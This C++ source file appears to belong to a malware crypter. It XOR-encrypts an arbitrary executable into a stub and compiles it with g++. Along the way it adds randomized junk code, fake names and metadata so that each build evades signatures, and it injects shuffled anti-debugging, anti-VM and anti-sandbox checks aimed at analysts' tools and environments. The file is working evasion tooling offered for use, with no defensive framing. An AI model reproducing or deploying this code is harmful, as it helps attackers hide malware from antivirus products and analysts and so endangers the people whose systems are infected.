#include "randomized_stub.h"
#include <fstream>
#include <sstream>
#include <random>
#include <ctime>
#include <windows.h>
#include <vector>
#include <cstdio>
#include <algorithm>
#include <iomanip>

std::string RandomString(size_t len) {
    static const char abc[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string s;
    std::random_device rd; std::mt19937 mt(rd());
    std::uniform_int_distribution<> dist(0, sizeof(abc)-2);
    for (size_t i=0; i<len; ++i) s += abc[dist(mt)];
    return s;
}

// --- JUNK CODE ---
std::string GenerateJunkCode(int lines) {
    std::string junk;
    std::vector<std::string> junkTemplates = {
        "volatile int junk%d = %d;\n",
        "junk%d += %d;\n",
        "for(int k=0;k<%d;++k) junk%d+=k;\n",
        "SetLastError(%d);\n",
        "DWORD tick%d = GetTickCount();\n",
        "volatile DWORD dummy%d = tick%d ^ %d;\n",
        "if (dummy%d %% 2) tick%d++;\n",
        "SYSTEMTIME st%d; GetSystemTime(&st%d);\n",
        "volatile int calc%d = st%d.wYear * %d;\n"
    };
    
    for (int i = 0; i < lines; ++i) {
        int templateIdx = rand() % junkTemplates.size();
        char buffer[256];
        
        switch (templateIdx) {
            case 0: // volatile int
                sprintf(buffer, junkTemplates[templateIdx].c_str(), i, rand() % 1000000);
                break;
            case 1: // junk += 
                if (i > 0) sprintf(buffer, junkTemplates[templateIdx].c_str(), i-1, rand() % 200);
                else continue;
                break;
            case 2: // for loop
                if (i > 0) sprintf(buffer, junkTemplates[templateIdx].c_str(), rand() % 10 + 1, i-1);
                else continue;
                break;
            case 3: // SetLastError
                sprintf(buffer, junkTemplates[templateIdx].c_str(), rand() % 1000);
                break;
            case 4: // GetTickCount
                sprintf(buffer, junkTemplates[templateIdx].c_str(), i);
                break;
            case 5: // dummy calculation
                sprintf(buffer, junkTemplates[templateIdx].c_str(), i, i, rand() % 0xFFFF);
                break;
            case 6: // conditional
                sprintf(buffer, junkTemplates[templateIdx].c_str(), i, i);
                break;
            case 7: // SYSTEMTIME
                sprintf(buffer, junkTemplates[templateIdx].c_str(), i, i);
                break;
            case 8: // calculation with time
                sprintf(buffer, junkTemplates[templateIdx].c_str(), i, i, rand() % 100 + 1);
                break;
        }
        junk += buffer;
    }
    return junk;
}

// --- ANTIDEBUG ---
std::string GenerateAntiDebugCode() {
    std::vector<std::string> checks;
    checks.push_back("if (IsDebuggerPresent()) return true;");
    checks.push_back(R"(
        __try { __asm int 3 } __except(EXCEPTION_EXECUTE_HANDLER) { }
    )");
    checks.push_back(R"(
        BOOL bDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebugger);
        if (bDebugger) return true;
    )");
    checks.push_back(R"(
        // PEB BeingDebugged flag check (x86/x64 compatible)
        #ifdef _WIN64
        PPEB pPEB = (PPEB)__readgsqword(0x60);
        #else
        PPEB pPEB = (PPEB)__readfsdword(0x30);
        #endif
        if (pPEB && pPEB->BeingDebugged) return true;
    )");
    checks.push_back(R"(
        // NtGlobalFlag check
        #ifdef _WIN64
        PPEB pPEB = (PPEB)__readgsqword(0x60);
        #else
        PPEB pPEB = (PPEB)__readfsdword(0x30);
        #endif
        if (pPEB && (pPEB->NtGlobalFlag & 0x70)) return true;
    )");
    checks.push_back(R"(
        // Heap flags check
        #ifdef _WIN64
        PPEB pPEB = (PPEB)__readgsqword(0x60);
        #else
        PPEB pPEB = (PPEB)__readfsdword(0x30);
        #endif
        if (pPEB) {
            PVOID heap = pPEB->ProcessHeap;
            if (heap) {
                DWORD flags = *(DWORD*)((ULONG_PTR)heap + 0x40);
                if (flags & 0x50000062) return true;
            }
        }
    )");
    checks.push_back(R"(
        OutputDebugStringA("debug?");
        if (GetLastError() != 0) return true;
    )");
    checks.push_back(R"(
        // CloseHandle invalid handle check
        __try {
            CloseHandle((HANDLE)0xDEADBEEF);
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            return true;
        }
    )");
    checks.push_back(R"(
        // NtQueryInformationProcess ProcessDebugPort
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
            pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
            if (NtQIP) {
                DWORD debugPort = 0;
                if (NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL) == 0 && debugPort) return true;
            }
        }
    )");
    checks.push_back(R"(
        DWORD t1 = GetTickCount(); for (volatile int i=0;i<100000;i++); DWORD t2 = GetTickCount();
        if ((t2-t1) < 1) return true;
    )");
    std::string code;
    int n = rand() % 3 + 3; // Use 3-5 checks
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n && i<checks.size(); ++i) code += checks[i] + "\n";
    return code + "return false;";
}

// --- ANTIVM ---
std::string GenerateAntiVMCode() {
    std::vector<std::string> checks;
    checks.push_back(R"(
        char name[256] = {};
        DWORD sz=256;
        GetComputerNameA(name, &sz);
        if (strstr(name, "VBOX") || strstr(name, "VMWARE") || strstr(name,"QEMU") || strstr(name, "VIRTUAL")) return true;
    )");
    checks.push_back(R"(
        HKEY hKey;
        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VBoxGuest",0,KEY_READ,&hKey)==ERROR_SUCCESS) {RegCloseKey(hKey); return true;}
        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VMTools",0,KEY_READ,&hKey)==ERROR_SUCCESS) {RegCloseKey(hKey); return true;}
    )");
    checks.push_back(R"(
        // Check for VM-specific files
        if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES) return true;
        if (GetFileAttributesA("C:\\windows\\system32\\drivers\\VBoxMouse.sys") != INVALID_FILE_ATTRIBUTES) return true;
        if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vmhgfs.sys") != INVALID_FILE_ATTRIBUTES) return true;
    )");
    checks.push_back(R"(
        // Check for VM processes
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {sizeof(pe)};
            if (Process32First(snap, &pe)) {
                do {
                    if (strstr(pe.szExeFile, "vmware") || strstr(pe.szExeFile, "vbox") || 
                        strstr(pe.szExeFile, "qemu") || strstr(pe.szExeFile, "virtualbox")) { 
                        CloseHandle(snap); return true; 
                    }
                } while(Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    )");
    checks.push_back(R"(
        // Check MAC address for VM indicators
        DWORD dwSize = 0;
        GetAdaptersInfo(NULL, &dwSize);
        if (dwSize > 0) {
            PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(dwSize);
            if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &dwSize) == ERROR_SUCCESS) {
                for (PIP_ADAPTER_INFO pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
                    // VMware MAC prefixes: 00:0C:29, 00:1C:14, 00:50:56
                    // VirtualBox: 08:00:27
                    if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                        (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x14) ||
                        (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                        (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27)) {
                        free(pAdapterInfo);
                        return true;
                    }
                }
                free(pAdapterInfo);
            }
        }
    )");
    checks.push_back(R"(
        // Check system model
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char szData[1024];
            DWORD dwSize = sizeof(szData);
            if (RegQueryValueExA(hKey, "0", NULL, NULL, (LPBYTE)szData, &dwSize) == ERROR_SUCCESS) {
                if (strstr(szData, "VBOX") || strstr(szData, "VMWARE") || strstr(szData, "QEMU")) {
                    RegCloseKey(hKey);
                    return true;
                }
            }
            RegCloseKey(hKey);
        }
    )");
    checks.push_back(R"(
        // CPUID VM detection
        int info[4] = {0};
        __cpuid(info, 1);
        // Check hypervisor bit (bit 31 of ECX)
        if (info[2] & (1 << 31)) return true;
    )");
    std::string code;
    int n = rand() % 3 + 2; // Use 2-4 checks
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n && i<checks.size(); ++i) code += checks[i] + "\n";
    return code + "return false;";
}

// --- ANTISANDBOX ---
std::string GenerateAntiSandboxCode() {
    std::vector<std::string> checks;
    checks.push_back(R"(
        // Если нет мыши — подозрение на sandbox
        if (GetSystemMetrics(SM_MOUSEPRESENT)==0) return true;
    )");
    checks.push_back(R"(
        // Sandboxie check
        if (GetModuleHandleA("SbieDll.dll")) return true;
        if (GetModuleHandleA("dbghelp.dll")) return true;
        if (GetModuleHandleA("api_log.dll")) return true;
    )");
    checks.push_back(R"(
        // Проверка на процессы типа cuckoomon
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {sizeof(pe)};
            if (Process32First(snap, &pe)) {
                do {
                    if (strstr(pe.szExeFile, "cuckoo") || strstr(pe.szExeFile, "sandbox") || 
                        strstr(pe.szExeFile, "analyst") || strstr(pe.szExeFile, "malware") ||
                        strstr(pe.szExeFile, "virus") || strstr(pe.szExeFile, "sample")) { 
                        CloseHandle(snap); return true; 
                    }
                } while(Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    )");
    checks.push_back(R"(
        // Check for low uptime (sandbox often rebooted)
        DWORD uptime = GetTickCount();
        if (uptime < 600000) return true; // Less than 10 minutes
    )");
    checks.push_back(R"(
        // Check for small RAM (common in sandboxes)
        MEMORYSTATUSEX memInfo = {sizeof(memInfo)};
        if (GlobalMemoryStatusEx(&memInfo)) {
            if (memInfo.ullTotalPhys < 2147483648ULL) return true; // Less than 2GB
        }
    )");
    checks.push_back(R"(
        // Check for temp file patterns
        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath)) {
            if (strstr(tempPath, "sample") || strstr(tempPath, "virus") || strstr(tempPath, "malware")) return true;
        }
    )");
    checks.push_back(R"(
        // Check user interaction (mouse movement)
        POINT pt1, pt2;
        GetCursorPos(&pt1);
        Sleep(500);
        GetCursorPos(&pt2);
        if (pt1.x == pt2.x && pt1.y == pt2.y) return true;
    )");
    checks.push_back(R"(
        // Check for common sandbox usernames
        char username[256];
        DWORD userSize = sizeof(username);
        if (GetUserNameA(username, &userSize)) {
            if (strstr(username, "sandbox") || strstr(username, "malware") || 
                strstr(username, "virus") || strstr(username, "test") ||
                strcmp(username, "Administrator") == 0) return true;
        }
    )");
    checks.push_back(R"(
        // Check for analysis tools in windows
        if (FindWindowA("PROCEXPL", NULL)) return true; // Process Explorer
        if (FindWindowA("RegmonClass", NULL)) return true; // Regmon
        if (FindWindowA("FilemonClass", NULL)) return true; // Filemon
        if (FindWindowA("WinDbgFrameClass", NULL)) return true; // WinDbg
    )");
    std::string code;
    int n = rand() % 3 + 2; // Use 2-4 checks
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n && i<checks.size(); ++i) code += checks[i] + "\n";
    return code + "return false;";
}

// --- ANTITIMING ---
std::string GenerateAntiTimingCode() {
    return R"(
        LARGE_INTEGER f1,f2,ft; QueryPerformanceFrequency(&ft);
        QueryPerformanceCounter(&f1);
        for (volatile int i=0; i<1000000; i++);
        QueryPerformanceCounter(&f2);
        if ((f2.QuadPart - f1.QuadPart) < ft.QuadPart/1000) return true;
        return false;
    )";
}

// --- PAYLOAD HEX ---
std::string BytesToHexArray(const std::vector<uint8_t>& data) {
    if (data.empty()) return "";
    
    std::ostringstream oss;
    for (size_t i=0; i<data.size(); ++i) {
        oss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)data[i];
        if (i+1 != data.size()) oss << ",";
        
        // Prevent too long lines
        if (i > 0 && (i+1) % 16 == 0 && i+1 != data.size()) {
            oss << "\n        ";
        }
    }
    return oss.str();
}

bool GenerateRandomizedStub(const std::vector<uint8_t>& exe, std::vector<uint8_t>& outStub) {
    std::ifstream in("stub_template.cpp");
    if (!in) return false;
    std::stringstream ss; ss << in.rdbuf();
    std::string code = ss.str();

    std::string key = RandomString(16);
    int method = (int)(std::time(nullptr)) % 2;
    std::string randstr = RandomString(10);
    uint32_t buildTime = (uint32_t)std::time(nullptr);

    std::vector<uint8_t> payload = exe;
    for (size_t i=0; i<payload.size(); ++i)
        payload[i] ^= key[i % key.size()];

    // Add random function names for uniquification
    std::vector<std::string> randomFuncNames;
    for (int i = 0; i < 6; ++i) {
        randomFuncNames.push_back("Func_" + RandomString(8));
    }
    
    // Add random unused strings
    std::string randomStrings;
    for (int i = 0; i < 3; ++i) {
        randomStrings += "static const char* unused_str" + std::to_string(i) + " = \"" + RandomString(20) + "\";\n";
    }
    
    // Add random metadata
    std::string randomMetadata = 
        "// Build ID: " + RandomString(16) + "\n" +
        "// Compiler: MinGW-" + std::to_string(rand() % 10 + 4) + "." + std::to_string(rand() % 5) + "\n" +
        "// Target: " + (rand() % 2 ? "x86" : "x64") + "\n";

    // Insert random metadata at the beginning
    code = randomMetadata + randomStrings + code;

    // Подставляем JUNK1..JUNK6 with enhanced junk
    for (int j=1;j<=6;++j) {
        std::string marker = "/*JUNK" + std::to_string(j) + "*/";
        std::string val = GenerateJunkCode(5 + rand()%8); // More junk
        // Add random function call
        val += "if (GetTickCount() % 17 == 0) " + randomFuncNames[j-1] + "();\n";
        size_t pos; while((pos=code.find(marker))!=std::string::npos) code.replace(pos, marker.size(), val);
    }
    
    // Add random function implementations
    std::string randomFuncs;
    for (const auto& funcName : randomFuncNames) {
        randomFuncs += "void " + funcName + "() { ";
        randomFuncs += "volatile int x = " + std::to_string(rand() % 1000) + "; ";
        randomFuncs += "for(int i=0;i<x%10;++i) SetLastError(i); }\n";
    }
    
    // Insert functions before main
    size_t mainPos = code.find("int WINAPI WinMain");
    if (mainPos != std::string::npos) {
        code.insert(mainPos, randomFuncs + "\n");
    }
    
    // Подставляем анти-анализ
    size_t pos;
    while ((pos = code.find("//ANTIDEBUG")) != std::string::npos) code.replace(pos, 12, GenerateAntiDebugCode());
    while ((pos = code.find("//ANTIVM")) != std::string::npos) code.replace(pos, 9, GenerateAntiVMCode());
    while ((pos = code.find("//ANTISANDBOX")) != std::string::npos) code.replace(pos, 15, GenerateAntiSandboxCode());
    while ((pos = code.find("//ANTITIMING")) != std::string::npos) code.replace(pos, 13, GenerateAntiTimingCode());
    // Остальные маркеры
    while ((pos = code.find("/*KEY*/")) != std::string::npos) code.replace(pos, 8, key);
    while ((pos = code.find("/*METHOD*/")) != std::string::npos) code.replace(pos, 11, std::to_string(method));
    while ((pos = code.find("/*RANDSTR*/")) != std::string::npos) code.replace(pos, 12, randstr);
    while ((pos = code.find("/*BUILDTIME*/")) != std::string::npos) code.replace(pos, 13, std::to_string(buildTime));
    while ((pos = code.find("/*PAYLOAD*/")) != std::string::npos) code.replace(pos, 11, BytesToHexArray(payload));

    // Сохраняем временный .cpp, компилируем и очищаем
    const char* build_cpp = "stub_build.cpp";
    const char* build_exe = "stub_build.exe";
    std::ofstream out(build_cpp); out << code; out.close();
    std::string cmd = "g++ -std=c++17 -O2 -mwindows -liphlpapi -lpsapi ";
    cmd += build_cpp; cmd += " -o "; cmd += build_exe;
    int ok = system(cmd.c_str());
    if (ok != 0) { 
        std::remove(build_cpp); 
        std::remove(build_exe); 
        return false; 
    }
    std::ifstream in2(build_exe, std::ios::binary);
    if (!in2) {
        std::remove(build_cpp); 
        std::remove(build_exe);
        return false;
    }
    outStub.assign(std::istreambuf_iterator<char>(in2), std::istreambuf_iterator<char>());
    in2.close();
    std::remove(build_cpp); 
    std::remove(build_exe);
    return !outStub.empty();
}